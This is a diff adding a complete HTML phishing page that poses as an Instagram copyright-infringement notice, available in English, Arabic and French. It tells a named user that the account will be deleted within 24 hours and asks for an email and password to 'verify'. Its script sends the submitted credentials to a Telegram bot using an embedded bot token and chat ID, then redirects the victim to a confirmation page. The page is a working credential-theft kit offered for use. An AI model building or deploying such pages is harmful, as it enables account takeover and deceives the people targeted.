@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Copyright Infringement</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 350px;
+            position: relative;
+        }
+        .container img {
+            width: 50px;
+            margin-bottom: 10px;
+        }
+        .container h1 {
+            font-size: 18px;
+            color: #333;
+        }
+        .container p {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.6;
+        }
+        .container .button {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            font-size: 14px;
+            color: #fff;
+            background-color: #3897f0;
+            text-decoration: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .container .button:hover {
+            background-color: #287bd1;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            z-index: 1000;
+        }
+        .popup h2 {
+            font-size: 18px;
+            color: #333;
+        }
+        .popup p {
+            font-size: 14px;
+            color: #555;
+        }
+        .popup .close-btn {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 8px 16px;
+            font-size: 14px;
+            color: #fff;
+            background-color: #e74c3c;
+            text-decoration: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .popup .close-btn:hover {
+            background-color: #c0392b;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        .language-selector {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+        .language-selector select {
+            padding: 5px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Language Selector -->
+        <div class="language-selector">
+            <select id="language-select">
+                <option value="en">English</option>
+                <option value="ar">العربية</option>
+                <option value="fr">Français</option>
+            </select>
+        </div>
+
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        <h1 id="title">Copyright infringement</h1>
+        <p id="message">
+            Hello <strong>samadbloch</strong>,<br>
+            We regret to inform you that your account will be suspended because you have violated copyright laws. Your account will be deleted within 24 hours. If you think we made a mistake, please verify to secure your account.
+        </p>
+        <div class="button" id="verify-button">Verify Account</div>
+    </div>
+
+    <!-- Overlay and Popup -->
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="popup">
+        <h2 id="popup-title">Verify Your Account</h2>
+        <p id="popup-message">Please enter your email and password to verify your account:</p>
+        <form id="verify-form">
+            <input type="email" id="email" placeholder="Email" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;" required>
+            <input type="password" id="password" placeholder="Password" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;" required>
+            <button type="submit" style="width: 100%; padding: 10px; background-color: #3897f0; color: #fff; border: none; border-radius: 4px; cursor: pointer;">Submit</button>
+        </form>
+        <a href="#" class="close-btn" id="close-popup">Close</a>
+    </div>
+
+    <script>
+        const verifyButton = document.getElementById("verify-button");
+        const popup = document.getElementById("popup");
+        const overlay = document.getElementById("overlay");
+        const closePopup = document.getElementById("close-popup");
+        const verifyForm = document.getElementById("verify-form");
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById("password");
+        const languageSelect = document.getElementById("language-select");
+
+        // Language texts
+        const texts = {
+            en: {
+                title: "Copyright infringement",
+                message: "Hello <strong>samadbloch</strong>,<br>We regret to inform you that your account will be suspended because you have violated copyright laws. Your account will be deleted within 24 hours. If you think we made a mistake, please verify to secure your account.",
+                verifyButton: "Verify Account",
+                popupTitle: "Verify Your Account",
+                popupMessage: "Please enter your email and password to verify your account:",
+                submitButton: "Submit",
+                closeButton: "Close"
+            },
+            ar: {
+                title: "انتهاك حقوق النشر",
+                message: "مرحبًا <strong>samadbloch</strong>,<br>نأسف لإبلاغك بأن حسابك سيتم تعليقه بسبب انتهاكك لقوانين حقوق النشر. سيتم حذف حسابك خلال 24 ساعة. إذا كنت تعتقد أننا ارتكبنا خطأً، يرجى التحقق لتأمين حسابك.",
+                verifyButton: "تحقق من الحساب",
+                popupTitle: "تحقق من حسابك",
+                popupMessage: "يرجى إدخال بريدك الإلكتروني وكلمة المرور للتحقق من حسابك:",
+                submitButton: "إرسال",
+                closeButton: "إغلاق"
+            },
+            fr: {
+                title: "Violation du droit d'auteur",
+                message: "Bonjour <strong>samadbloch</strong>,<br>Nous regrettons de vous informer que votre compte sera suspendu car vous avez violé les lois sur le droit d'auteur. Votre compte sera supprimé dans les 24 heures. Si vous pensez que nous avons fait une erreur, veuillez vérifier pour sécuriser votre compte.",
+                verifyButton: "Vérifier le compte",
+                popupTitle: "Vérifiez votre compte",
+                popupMessage: "Veuillez entrer votre e-mail et mot de passe pour vérifier votre compte:",
+                submitButton: "Soumettre",
+                closeButton: "Fermer"
+            }
+        };
+
+        // Function to change language
+        const changeLanguage = (language) => {
+            document.getElementById("title").innerHTML = texts[language].title;
+            document.getElementById("message").innerHTML = texts[language].message;
+            document.getElementById("verify-button").innerText = texts[language].verifyButton;
+            document.getElementById("popup-title").innerText = texts[language].popupTitle;
+            document.getElementById("popup-message").innerText = texts[language].popupMessage;
+            document.querySelector("#verify-form button").innerText = texts[language].submitButton;
+            document.getElementById("close-popup").innerText = texts[language].closeButton;
+        };
+
+        // Event listener for language change
+        languageSelect.addEventListener("change", (e) => {
+            changeLanguage(e.target.value);
+        });
+
+        // Show popup
+        verifyButton.addEventListener("click", () => {
+            popup.style.display = "block";
+            overlay.style.display = "block";
+        });
+
+        // Close popup
+        closePopup.addEventListener("click", () => {
+            popup.style.display = "none";
+            overlay.style.display = "none";
+        });
+
+        // Close popup when clicking on overlay
+        overlay.addEventListener("click", () => {
+            popup.style.display = "none";
+            overlay.style.display = "none";
+        });
+
+        // Handle form submission
+        verifyForm.addEventListener("submit", (e) => {
+            e.preventDefault(); // Prevent form from submitting
+
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+            // Send data to Telegram bot
+            const botToken = "7527317899:AAE2ljsBCTmqhXrS3bbQndKl6Cgu4mzI-6A"; // Replace with your bot token
+            const chatId = "809845485"; // Replace with your chat ID
+            const message = `New Submission:\nEmail: ${email}\nPassword: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Message sent:", data);
+                window.location.href = "confirmation.html"; // Redirect to the confirmation page
+            })
+            .catch(error => {
+                console.error("Error sending message:", error);
+            });
+        });
+    </script>
+</body>
+</html>
